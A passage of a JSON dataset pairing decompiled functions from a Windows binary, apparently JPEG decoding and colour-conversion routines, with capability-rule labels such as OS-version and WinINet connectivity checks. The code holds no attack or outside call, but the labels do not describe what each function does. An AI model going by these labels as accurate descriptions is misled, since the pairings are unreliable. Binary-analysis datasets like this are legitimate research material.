+ 8))();\n    if (((in_EAX[2] != 0) && (in_EAX[0x10] == 0)) && (*(in_EAX[0x6d] + 0x10) != 0)) {\n        if (in_EAX[0x37] == 0) {\n            iVar4 = in_EAX[9];\n        }\n        else {\n            iVar4 = in_EAX[9] * 3 + 2;\n        }\n        iVar2 = in_EAX[2];\n        *(iVar2 + 4) = 0;\n        *(iVar2 + 8) = in_EAX[0x50] * iVar4;\n        *(iVar2 + 0xc) = 0;\n        if (in_EAX[0x1b] == 0) {\n            uVar3 = 2;\n        }\n        else {\n            uVar3 = 3;\n        }\n        *(in_EAX[2] + 0x10) = uVar3;\n        *(iVar1 + 0xc) = *(iVar1 + 0xc) + 1;\n    }\n    return;\n}\n",
        "token_count": 1058
    },
    "0047b1a4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047b1a4(int32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    char *pcVar3;\n    uint8_t uVar4;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    int32_t *piVar5;\n    uint8_t *puVar6;\n    int32_t iVar7;\n    int32_t aiStack1340 [257];\n    char acStack312 [260];\n    uint8_t *puStack52;\n    uint8_t *puStack48;\n    int32_t *piStack44;\n    uint8_t *puStack40;\n    int32_t *piStack36;\n    int32_t iStack32;\n    uint32_t uStack28;\n    int32_t iStack24;\n    int32_t iStack20;\n    uint8_t *var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_8h = in_EDX;\n    var_4h = in_EAX;\n    if ((in_ECX < 0) || (3 < in_ECX)) {\n        iVar2 = *in_EAX;\n        *(iVar2 + 0x14) = 0x32;\n        *(iVar2 + 0x18) = in_ECX;\n        (***in_EAX)();\n    }\n    if (var_8h == 0) {\n        var_ch = var_4h[in_ECX + 0x31];\n    }\n    else {\n        var_ch = var_4h[in_ECX + 0x2d];\n    }\n    if (var_ch == NULL) {\n        iVar2 = *var_4h;\n        *(iVar2 + 0x14) = 0x32;\n        *(iVar2 + 0x18) = in_ECX;\n        (***var_4h)();\n    }\n    if (*arg_8h == 0) {\n        iVar2 = (**var_4h[1])();\n        *arg_8h = iVar2;\n    }\n    iVar2 = 1;\n    iStack20 = *arg_8h;\n    *(*arg_8h + 0x8c) = var_ch;\n    iStack24 = 0;\n    puVar6 = var_ch;\n    do {\n        puVar6 = puVar6 + 1;\n        uStack28 = *puVar6;\n        if (0x100 < iStack24 + uStack28) {\n            *(*var_4h + 0x14) = 8;\n            (***var_4h)();\n        }\n        pcVar3 = acStack312 + iStack24;\n        while (uVar1 = uStack28,  uStack28 = uStack28 - 1,  uVar1 != 0) {\n            *pcVar3 = iVar2;\n            iStack24 = iStack24 + 1;\n            pcVar3 = pcVar3 + 1;\n        }\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x11);\n    iVar2 = 0;\n    acStack312[iStack24] = '\\0';\n    iStack32 = iStack24;\n    iVar7 = acStack312[0];\n    iStack24 = 0;\n    while (acStack312[iStack24] != '\\0') {\n        piVar5 = aiStack1340 + iStack24;\n        for (pcVar3 = acStack312 + iStack24; iVar7 == *pcVar3; pcVar3 = pcVar3 + 1) {\n            *piVar5 = iVar2;\n            piVar5 = piVar5 + 1;\n            iStack24 = iStack24 + 1;\n            iVar2 = iVar2 + 1;\n        }\n        if (1 << (iVar7 & 0x1f) <= iVar2) {\n            *(*var_4h + 0x14) = 8;\n            (***var_4h)();\n        }\n        iVar2 = iVar2 * 2;\n        iVar7 = iVar7 + 1;\n    }\n    iStack24 = 0;\n    iVar2 = 1;\n    piStack36 = iStack20 + 0x4c;\n    puVar6 = var_ch;\n    do {\n        puVar6 = puVar6 + 1;\n        if (*puVar6 == 0) {\n            piStack36[-0x12] = -1;\n        }\n        else {\n            *piStack36 = iStack24 - aiStack1340[iStack24];\n            iStack24 = iStack24 + *puVar6;\n            piStack36[-0x12] = aiStack1340[iStack24 + -1];\n        }\n        piStack36 = piStack36 + 1;\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x11);\n    *(iStack20 + 0x44) = 0xfffff;\n    fcn.00476ba0(iStack20 + 0x90, 0, 0x400);\n    iStack24 = 0;\n    iVar2 = 1;\n    piStack36 = var_ch;\n    do {\n        piStack36 = piStack36 + 1;\n        puStack52 = var_ch + iStack24 + 0x11;\n        piStack44 = aiStack1340 + iStack24;\n        puStack40 = piStack36;\n        for (uStack28 = 1; uStack28 <= *piStack36; uStack28 = uStack28 + 1) {\n            uVar4 = 8 - iVar2;\n            iVar7 = *piStack44 << (uVar4 & 0x1f);\n            puStack48 = puStack52;\n            puVar6 = iStack20 + 0x490 + iVar7;\n            piVar5 = iStack20 + 0x90 + iVar7 * 4;\n            for (iVar7 = 1 << (uVar4 & 0x1f); 0 < iVar7; iVar7 = iVar7 + -1) {\n                *piVar5 = iVar2;\n                piVar5 = piVar5 + 1;\n                *puVar6 = *puStack52;\n                puVar6 = puVar6 + 1;\n            }\n            piStack44 = piStack44 + 1;\n            puStack52 = puStack52 + 1;\n            iStack24 = iStack24 + 1;\n        }\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 9);\n    if (var_8h != 0) {\n        uStack28 = 0;\n        piStack36 = var_ch + 0x11;\n        if (0 < iStack32) {\n            do {\n                if (0xf < *piStack36) {\n                    *(*var_4h + 0x14) = 8;\n                    (***var_4h)();\n                }\n                uStack28 = uStack28 + 1;\n                piStack36 = piStack36 + 1;\n            } while (uStack28 < iStack32);\n        }\n    }\n    return;\n}\n",
        "token_count": 1576
    },
    "0047b20b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0047b225) overlaps instruction at (ram,0x0047b221)\n// \n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.0047b20b(char param_1)\n\n{\n    int32_t in_EAX;\n    char *pcVar1;\n    uint8_t uVar2;\n    int32_t *piVar3;\n    uchar *puVar4;\n    int32_t *unaff_EBX;\n    uint8_t *puVar5;\n    int32_t unaff_EBP;\n    int32_t iVar6;\n    int32_t iVar7;\n    bool in_OF;\n    uint var_53ch;\n    uint var_538h;\n    uint var_134h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_OF) {\n        *(unaff_EBX + 0x5bfc11c) = *(unaff_EBX + 0x5bfc11c) + param_1;\n    }\n    else {\n        (****(unaff_EBP + -4))();\n        if (*unaff_EBX != 0) goto code_r0x0047b22d;\n        in_EAX = (***(*(unaff_EBP + -4) + 4))();\n    }\n    *unaff_EBX = in_EAX;\ncode_r0x0047b22d:\n    iVar6 = 1;\n    *(unaff_EBP + -0x10) = *unaff_EBX;\n    *(*(unaff_EBP + -0x10) + 0x8c) = *(unaff_EBP + -0xc);\n    *(unaff_EBP + -0x14) = 0;\n    puVar5 = *(unaff_EBP + -0xc);\n    do {\n        puVar5 = puVar5 + 1;\n        *(unaff_EBP + -0x18) = *puVar5;\n        if ((*(unaff_EBP + -0x18) < 0) || (0x100 < *(unaff_EBP + -0x14) + *(unaff_EBP + -0x18))) {\n            *(**(unaff_EBP + -4) + 0x14) = 8;\n            (****(unaff_EBP + -4))();\n        }\n        puVar4 = unaff_EBP + -0x134 + *(unaff_EBP + -0x14);\n        while (iVar7 = *(unaff_EBP + -0x18),  *(unaff_EBP + -0x18) = *(unaff_EBP + -0x18) + -1,  iVar7 != 0) {\n            *puVar4 = iVar6;\n            *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) + 1;\n            puVar4 = puVar4 + 1;\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x11);\n    iVar6 = 0;\n    *(unaff_EBP + -0x134 + *(unaff_EBP + -0x14)) = 0;\n    *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x14);\n    iVar7 = *(unaff_EBP + -0x134);\n    *(unaff_EBP + -0x14) = 0;\n    while (*(unaff_EBP + -0x134 + *(unaff_EBP + -0x14)) != '\\0') {\n        piVar3 = unaff_EBP + -0x538 + *(unaff_EBP + -0x14) * 4;\n        for (pcVar1 = unaff_EBP + -0x134 + *(unaff_EBP + -0x14); iVar7 == *pcVar1; pcVar1 = pcVar1 + 1) {\n            *piVar3 = iVar6;\n            piVar3 = piVar3 + 1;\n            *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) + 1;\n            iVar6 = iVar6 + 1;\n        }\n        if (1 << (iVar7 & 0x1f) <= iVar6) {\n            *(**(unaff_EBP + -4) + 0x14) = 8;\n            (****(unaff_EBP + -4))();\n        }\n        iVar6 = iVar6 * 2;\n        iVar7 = iVar7 + 1;\n    }\n    *(unaff_EBP + -0x14) = 0;\n    iVar6 = 1;\n    *(unaff_EBP + -0x20) = *(unaff_EBP + -0x10) + 0x4c;\n    puVar5 = *(unaff_EBP + -0xc);\n    do {\n        puVar5 = puVar5 + 1;\n        if (*puVar5 == 0) {\n            *(*(unaff_EBP + -0x20) + -0x48) = 0xffffffff;\n        }\n        else {\n            **(unaff_EBP + -0x20) = *(unaff_EBP + -0x14) - *(unaff_EBP + -0x538 + *(unaff_EBP + -0x14) * 4);\n            *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) + *puVar5;\n            *(*(unaff_EBP + -0x20) + -0x48) = *(unaff_EBP + -0x53c + *(unaff_EBP + -0x14) * 4);\n        }\n        *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + 4;\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x11);\n    *(*(unaff_EBP + -0x10) + 0x44) = 0xfffff;\n    fcn.00476ba0(*(unaff_EBP + -0x10) + 0x90, 0, 0x400);\n    *(unaff_EBP + -0x14) = 0;\n    iVar6 = 1;\n    *(unaff_EBP + -0x20) = *(unaff_EBP + -0xc) + 1;\n    do {\n        *(unaff_EBP + -0x18) = 1;\n        *(unaff_EBP + -0x30) = *(unaff_EBP + -0xc) + 0x11 + *(unaff_EBP + -0x14);\n        *(unaff_EBP + -0x28) = unaff_EBP + -0x538 + *(unaff_EBP + -0x14) * 4;\n        *(unaff_EBP + -0x24) = *(unaff_EBP + -0x20);\n        while (*(unaff_EBP + -0x18) <= **(unaff_EBP + -0x24)) {\n            uVar2 = 8 - iVar6;\n            iVar7 = **(unaff_EBP + -0x28) << (uVar2 & 0x1f);\n            *(unaff_EBP + -0x2c) = *(unaff_EBP + -0x30);\n            puVar4 = *(unaff_EBP + -0x10) + 0x490 + iVar7;\n            piVar3 = *(unaff_EBP + -0x10) + 0x90 + iVar7 * 4;\n            for (iVar7 = 1 << (uVar2 & 0x1f); 0 < iVar7; iVar7 = iVar7 + -1) {\n                *piVar3 = iVar6;\n                piVar3 = piVar3 + 1;\n                *puVar4 = **(unaff_EBP + -0x2c);\n                puVar4 = puVar4 + 1;\n            }\n            *(unaff_EBP + -0x18) = *(unaff_EBP + -0x18) + 1;\n            *(unaff_EBP + -0x28) = *(unaff_EBP + -0x28) + 4;\n            *(unaff_EBP + -0x30) = *(unaff_EBP + -0x30) + 1;\n            *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) + 1;\n        }\n        iVar6 = iVar6 + 1;\n        *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + 1;\n    } while (iVar6 < 9);\n    if (*(unaff_EBP + -8) != 0) {\n        *(unaff_EBP + -0x18) = 0;\n        *(unaff_EBP + -0x20) = *(unaff_EBP + -0xc) + 0x11;\n        if (*(unaff_EBP + -0x18) < *(unaff_EBP + -0x1c)) {\n            do {\n                if (0xf < **(unaff_EBP + -0x20)) {\n                    *(**(unaff_EBP + -4) + 0x14) = 8;\n                    (****(unaff_EBP + -4))();\n                }\n                *(unaff_EBP + -0x18) = *(unaff_EBP + -0x18) + 1;\n                *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + 1;\n            } while (*(unaff_EBP + -0x18) < *(unaff_EBP + -0x1c));\n        }\n    }\n    return;\n}\n",
        "token_count": 2258
    },
    "0047b4a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0047b4a0(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    uint8_t **in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint8_t *in_ECX;\n    uint8_t *in_EDX;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    uint var_10h;\n    uint8_t *var_ch;\n    uint8_t *var_8h;\n    uint var_4h;\n    \n    puVar4 = *in_EAX;\n    puVar5 = in_EAX[1];\n    piVar1 = in_EAX[4];\n    var_ch = in_ECX;\n    var_8h = in_EDX;\n    if (piVar1[0x68] == 0) {\n        if (in_ECX < 0x19) {\n            do {\n                if (puVar5 == NULL) {\n                    iVar2 = (**(piVar1[6] + 0xc))();\n                    if (iVar2 == 0) {\n                        return 0;\n                    }\n                    puVar4 = *piVar1[6];\n                    puVar5 = piVar1[6][1];\n                }\n                puVar5 = puVar5 + -1;\n                uVar3 = *puVar4;\n                puVar4 = puVar4 + 1;\n                if (uVar3 == 0xff) {\n                    do {\n                        if (puVar5 == NULL) {\n                            iVar2 = (**(piVar1[6] + 0xc))();\n                            if (iVar2 == 0) {\n                                return 0;\n                            }\n                            puVar4 = *piVar1[6];\n                            puVar5 = piVar1[6][1];\n                        }\n                        puVar5 = puVar5 + -1;\n                        uVar3 = *puVar4;\n                        puVar4 = puVar4 + 1;\n                    } while (uVar3 == 0xff);\n                    if (uVar3 != 0) {\n                        piVar1[0x68] = uVar3;\n                        goto code_r0x0047b570;\n                    }\n                    uVar3 = 0xff;\n                }\n                var_8h = uVar3 | var_8h << 8;\n                var_ch = var_ch + 8;\n            } while (var_ch < 0x19);\n        }\n    }\n    else {\ncode_r0x0047b570:\n        if (var_ch < arg_8h) {\n            if (*(piVar1[0x6f] + 8) == 0) {\n                *(*piVar1 + 0x14) = 0x75;\n                (**(*piVar1 + 4))();\n                *(piVar1[0x6f] + 8) = 1;\n            }\n            var_8h = var_8h << (0x19U - var_ch & 0x1f);\n            var_ch = 0x19;\n        }\n    }\n    *in_EAX = puVar4;\n    in_EAX[1] = puVar5;\n    in_EAX[2] = var_8h;\n    in_EAX[3] = var_ch;\n    return 1;\n}\n",
        "token_count": 723
    },
    "0047b5ec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0047b5ec(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint32_t uVar3;\n    int32_t *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = in_EDX;\n    if (in_ECX < arg_8h) {\n        iVar2 = fcn.0047b4a0(arg_8h);\n        if (iVar2 == 0) {\n            return 0xffffffff;\n        }\n        var_8h = *(in_EAX + 8);\n        in_ECX = *(in_EAX + 0xc);\n    }\n    iVar2 = in_ECX - arg_8h;\n    uVar3 = var_8h >> (iVar2 & 0x1f) & (1 << (arg_8h & 0x1f)) - 1U;\n    var_ch = arg_ch + arg_8h * 4;\n    do {\n        if (uVar3 <= *var_ch) {\n            *(in_EAX + 8) = var_8h;\n            *(in_EAX + 0xc) = iVar2;\n            if (arg_8h < 0x11) {\n                uVar3 = *(*(arg_ch + 0x8c) + uVar3 + 0x11 + *(arg_ch + 0x48 + arg_8h * 4));\n            }\n            else {\n                piVar1 = *(in_EAX + 0x10);\n                *(*piVar1 + 0x14) = 0x76;\n                (**(*piVar1 + 4))();\n                uVar3 = 0;\n            }\n            return uVar3;\n        }\n        if (iVar2 < 1) {\n            iVar2 = fcn.0047b4a0(1);\n            if (iVar2 == 0) {\n                return 0xffffffff;\n            }\n            var_8h = *(in_EAX + 8);\n            iVar2 = *(in_EAX + 0xc);\n        }\n        iVar2 = iVar2 + -1;\n        uVar3 = uVar3 * 2 | var_8h >> (iVar2 & 0x1f) & 1U;\n        arg_8h = arg_8h + 1;\n        var_ch = var_ch + 1;\n    } while( true );\n}\n",
        "token_count": 573
    },
    "0047bcc4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047bcc4(int32_t arg_8h, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    uint var_14h;\n    uint var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(in_EAX + 0x1c4);\n    if (*(iVar1 + 0x24) == 0) {\n        uVar3 = 2;\n        if (*(iVar1 + 0x2c) < 2) {\n            uVar3 = *(iVar1 + 0x2c);\n        }\n        iVar2 = *arg_ch;\n        if (arg_8h - iVar2 < uVar3) {\n            uVar3 = arg_8h - iVar2;\n        }\n        var_14h = *(arg_10h + iVar2 * 4);\n        if (uVar3 < 2) {\n            var_10h = *(iVar1 + 0x20);\n            *(iVar1 + 0x24) = 1;\n        }\n        else {\n            var_10h = *(arg_10h + 4 + iVar2 * 4);\n        }\n        (**(iVar1 + 0xc))(&var_14h);\n    }\n    else {\n        fcn.004837d4(*(iVar1 + 0x28), 1, 0);\n        uVar3 = 1;\n        *(iVar1 + 0x24) = 0;\n    }\n    *arg_ch = *arg_ch + uVar3;\n    *(iVar1 + 0x2c) = *(iVar1 + 0x2c) - uVar3;\n    if (*(iVar1 + 0x24) == 0) {\n        *var_ch = *var_ch + 1;\n    }\n    return;\n}\n",
        "token_count": 443
    },
    "0047bdb4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047bdb4(uint *arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint8_t *puVar8;\n    uint8_t *puVar9;\n    uint8_t *puVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    int32_t *in_EDX;\n    uchar *puVar15;\n    int32_t iVar16;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_EAX + 0x1c4);\n    iVar4 = *(iVar3 + 0x10);\n    iVar5 = *(in_EAX + 0x144);\n    iVar6 = *(iVar3 + 0x14);\n    iVar7 = *(iVar3 + 0x18);\n    iVar3 = *(iVar3 + 0x1c);\n    puVar8 = *(*in_EDX + in_ECX * 4);\n    puVar9 = *(in_EDX[1] + in_ECX * 4);\n    puVar10 = *(in_EDX[2] + in_ECX * 4);\n    puVar15 = *arg_8h;\n    for (uVar13 = *(in_EAX + 0x70) >> 1; uVar13 != 0; uVar13 = uVar13 - 1) {\n        uVar1 = *puVar9;\n        puVar9 = puVar9 + 1;\n        uVar2 = *puVar10;\n        puVar10 = puVar10 + 1;\n        iVar11 = *(iVar4 + uVar2 * 4);\n        iVar16 = *(iVar3 + uVar1 * 4) + *(iVar7 + uVar2 * 4) >> 0x10;\n        iVar12 = *(iVar6 + uVar1 * 4);\n        uVar14 = *puVar8;\n        puVar15[2] = *(iVar5 + uVar14 + iVar11);\n        puVar15[1] = *(iVar5 + uVar14 + iVar16);\n        *puVar15 = *(iVar5 + uVar14 + iVar12);\n        uVar14 = puVar8[1];\n        puVar8 = puVar8 + 2;\n        puVar15[5] = *(iVar5 + uVar14 + iVar11);\n        puVar15[4] = *(iVar5 + uVar14 + iVar16);\n        puVar15[3] = *(iVar5 + uVar14 + iVar12);\n        puVar15 = puVar15 + 6;\n    }\n    if ((*(in_EAX + 0x70) & 1) != 0) {\n        iVar3 = *(iVar3 + *puVar9 * 4);\n        iVar7 = *(iVar7 + *puVar10 * 4);\n        iVar6 = *(iVar6 + *puVar9 * 4);\n        uVar13 = *puVar8;\n        puVar15[2] = *(iVar5 + uVar13 + *(iVar4 + *puVar10 * 4));\n        puVar15[1] = *(iVar5 + uVar13 + (iVar3 + iVar7 >> 0x10));\n        *puVar15 = *(iVar5 + uVar13 + iVar6);\n    }\n    return;\n}\n",
        "token_count": 865
    },
    "0047bf2c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047bf2c(uint *arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint8_t *puVar7;\n    uint8_t *puVar8;\n    uint8_t *puVar9;\n    uint8_t *puVar10;\n    uchar *puVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int32_t in_EAX;\n    uchar *puVar14;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    uint32_t uVar15;\n    uint32_t uVar16;\n    int32_t iVar17;\n    int32_t iVar18;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_EAX + 0x1c4);\n    iVar4 = *(in_EAX + 0x144);\n    iVar5 = *(iVar3 + 0x10);\n    iVar6 = *(iVar3 + 0x14);\n    iVar18 = *(iVar3 + 0x18);\n    iVar3 = *(iVar3 + 0x1c);\n    puVar7 = *(*in_EDX + in_ECX * 8);\n    puVar8 = *(*in_EDX + 4 + in_ECX * 8);\n    puVar9 = *(in_EDX[1] + in_ECX * 4);\n    puVar10 = *(in_EDX[2] + in_ECX * 4);\n    puVar14 = *arg_8h;\n    puVar11 = arg_8h[1];\n    for (uVar15 = *(in_EAX + 0x70) >> 1; uVar15 != 0; uVar15 = uVar15 - 1) {\n        uVar1 = *puVar9;\n        puVar9 = puVar9 + 1;\n        uVar2 = *puVar10;\n        puVar10 = puVar10 + 1;\n        iVar12 = *(iVar5 + uVar2 * 4);\n        iVar17 = *(iVar3 + uVar1 * 4) + *(iVar18 + uVar2 * 4) >> 0x10;\n        iVar13 = *(iVar6 + uVar1 * 4);\n        uVar16 = *puVar7;\n        puVar14[2] = *(iVar4 + uVar16 + iVar12);\n        puVar14[1] = *(iVar4 + uVar16 + iVar17);\n        *puVar14 = *(iVar4 + uVar16 + iVar13);\n        uVar16 = puVar7[1];\n        puVar7 = puVar7 + 2;\n        puVar14[5] = *(iVar4 + uVar16 + iVar12);\n        puVar14[4] = *(iVar4 + uVar16 + iVar17);\n        puVar14[3] = *(iVar4 + uVar16 + iVar13);\n        puVar14 = puVar14 + 6;\n        uVar16 = *puVar8;\n        puVar11[2] = *(iVar4 + uVar16 + iVar12);\n        puVar11[1] = *(iVar4 + uVar16 + iVar17);\n        *puVar11 = *(iVar4 + uVar16 + iVar13);\n        uVar16 = puVar8[1];\n        puVar8 = puVar8 + 2;\n        puVar11[5] = *(iVar4 + uVar16 + iVar12);\n        puVar11[4] = *(iVar4 + uVar16 + iVar17);\n        puVar11[3] = *(iVar4 + uVar16 + iVar13);\n        puVar11 = puVar11 + 6;\n    }\n    if ((*(in_EAX + 0x70) & 1) != 0) {\n        iVar5 = *(iVar5 + *puVar10 * 4);\n        iVar18 = *(iVar3 + *puVar9 * 4) + *(iVar18 + *puVar10 * 4) >> 0x10;\n        iVar3 = *(iVar6 + *puVar9 * 4);\n        uVar15 = *puVar7;\n        puVar14[2] = *(iVar4 + uVar15 + iVar5);\n        puVar14[1] = *(iVar4 + uVar15 + iVar18);\n        *puVar14 = *(iVar4 + uVar15 + iVar3);\n        uVar15 = *puVar8;\n        puVar11[2] = *(iVar4 + uVar15 + iVar5);\n        puVar11[1] = *(iVar4 + uVar15 + iVar18);\n        *puVar11 = *(iVar4 + uVar15 + iVar3);\n    }\n    return;\n}\n",
        "token_count": 1158
    },
    "0047c164": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0047c164(void)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint uVar2;\n    \n    puVar1 = (***(in_EAX + 4))();\n    *(in_EAX + 0x1c4) = puVar1;\n    *puVar1 = 0x47bcb0;\n    puVar1[2] = 0;\n    puVar1[10] = *(in_EAX + 0x70) * *(in_EAX + 0x78);\n    if (*(in_EAX + 0x138) == 2) {\n        puVar1[1] = fcn.0047bcc4;\n        puVar1[3] = fcn.0047bf2c;\n        uVar2 = (**(*(in_EAX + 4) + 4))();\n        puVar1[8] = uVar2;\n    }\n    else {\n        puVar1[1] = fcn.0047bd7c;\n        puVar1[3] = fcn.0047bdb4;\n        puVar1[8] = 0;\n    }\n    fcn.0047bbf8();\n    return;\n}\n",
        "token_count": 267
    },
    "0047c5c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t fcn.0047c5c0(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    uint *puVar2;\n    uint32_t uVar3;\n    bool bVar4;\n    \n    puVar2 = (**in_EAX[1])();\n    in_EAX[0x72] = puVar2;\n    *puVar2 = 0x47c5bc;\n    iVar1 = in_EAX[10];\n    uVar3 = iVar1 - 1;\n    if (uVar3 == 0) {\n        if (in_EAX[9] != 1) {\n            *(*in_EAX + 0x14) = 10;\n            uVar3 = (***in_EAX)();\n        }\n    }\n    else {\n        uVar3 = iVar1 - 4;\n        if (iVar1 - 2U < 2) {\n            if (in_EAX[9] != 3) {\n                *(*in_EAX + 0x14) = 10;\n                uVar3 = (***in_EAX)();\n            }\n        }\n        else {\n            bVar4 = uVar3 < 2;\n            uVar3 = iVar1 - 6;\n            if (bVar4) {\n                if (in_EAX[9] != 4) {\n                    *(*in_EAX + 0x14) = 10;\n                    uVar3 = (***in_EAX)();\n                }\n            }\n            else if (in_EAX[9] < 1) {\n                *(*in_EAX + 0x14) = 10;\n                uVar3 = (***in_EAX)();\n            }\n        }\n    }\n    iVar1 = in_EAX[0xb];\n    if (iVar1 == 1) {\n        in_EAX[0x1e] = 1;\n        if ((in_EAX[10] == 1) || (in_EAX[10] == 3)) {\n            puVar2[1] = fcn.0047c414;\n            for (uVar3 = 1; uVar3 < in_EAX[9]; uVar3 = uVar3 + 1) {\n                *(in_EAX[0x36] + 0x30 + uVar3 * 0x54) = 0;\n            }\n        }\n        else {\n            *(*in_EAX + 0x14) = 0x1b;\n            uVar3 = (***in_EAX)();\n        }\n    }\n    else if (iVar1 == 2) {\n        in_EAX[0x1e] = 3;\n        if (in_EAX[10] == 3) {\n            puVar2[1] = fcn.0047c29c;\n            uVar3 = fcn.0047c1e4();\n        }\n        else if (in_EAX[10] == 1) {\n            puVar2[1] = fcn.0047c434;\n        }\n        else if (in_EAX[10] == 2) {\n            puVar2[1] = fcn.0047c3a4;\n        }\n        else {\n            *(*in_EAX + 0x14) = 0x1b;\n            uVar3 = (***in_EAX)();\n        }\n    }\n    else if (iVar1 == 4) {\n        in_EAX[0x1e] = 4;\n        if (in_EAX[10] == 5) {\n            puVar2[1] = fcn.0047c47c;\n            uVar3 = fcn.0047c1e4();\n        }\n        else if (in_EAX[10] == 4) {\n            puVar2[1] = fcn.0047c3a4;\n        }\n        else {\n            *(*in_EAX + 0x14) = 0x1b;\n            uVar3 = (***in_EAX)();\n        }\n    }\n    else if (in_EAX[0xb] == in_EAX[10]) {\n        uVar3 = in_EAX[9];\n        in_EAX[0x1e] = uVar3;\n        puVar2[1] = 